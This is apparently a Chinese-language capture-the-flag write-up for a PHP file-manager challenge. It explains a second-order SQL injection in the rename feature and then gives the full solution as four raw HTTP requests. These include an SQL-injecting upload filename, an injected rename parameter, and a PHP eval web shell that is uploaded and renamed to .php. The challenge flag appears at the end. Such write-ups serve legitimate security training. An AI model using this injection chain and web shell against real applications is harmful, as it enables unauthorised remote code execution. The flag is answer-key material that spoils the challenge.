# filemanager

## 思路分析

> 扫目录,发现/www.tar.gz存在源码文件,下载之后开始分析,文件上传限制了后缀名,查询文件名是否存在,进行了addslashes()转义,oldname和filename拼接的后缀查出的结果都是相同的,不存在直接注入漏洞.

> 删除文件模块就是单纯的删除文件,无利用点.

> 重命名文件存在二次注入,从数据库查询输入的oldname是否在于filename字段,然后进行update修改,oldname={$result[‘filename’]},将之前从数据库中查询出的filename更新到oldname当中,再次入库造成二次注入.可以通过sql注入,影响其extension为空,再修改文件时加上.php后缀.绕过file_exists()只需要再次上传一个与数据库当中filename的值相同的文件名即可.二次注入语句为:

```
update `file` set `filename`='upload.jpg', `oldname`='',extension='' where `fid`={$result['fid']}"
```

## payload

```
POST /upload.php HTTP/1.1
Host: 61.147.171.105:61564
Content-Length: 204
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61564
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySA6f77RLIO31A4zm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61564/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarySA6f77RLIO31A4zm
Content-Disposition: form-data; name="upfile"; filename="',extension='.jpg"
Content-Type: image/jpeg

test


------WebKitFormBoundarySA6f77RLIO31A4zm--

```

```
POST /rename.php HTTP/1.1
Host: 61.147.171.105:61564
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61564
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61564/rename.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

oldname=%27%2Cextension%3D%27&newname=upload.jpg
```

```
POST /upload.php HTTP/1.1
Host: 61.147.171.105:61564
Content-Length: 222
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61564
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySA6f77RLIO31A4zm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61564/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarySA6f77RLIO31A4zm
Content-Disposition: form-data; name="upfile"; filename="upload.jpg"
Content-Type: image/jpeg

<?php @eval($_POST['123']) ?>


------WebKitFormBoundarySA6f77RLIO31A4zm--
```

```
POST /rename.php HTTP/1.1
Host: 61.147.171.105:61564
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61564
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61564/rename.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

oldname=upload.jpg&newname=upload.php
```

## flag

> cyberpeace{e7fbd79925c2b1677eb9ccc153f6293e}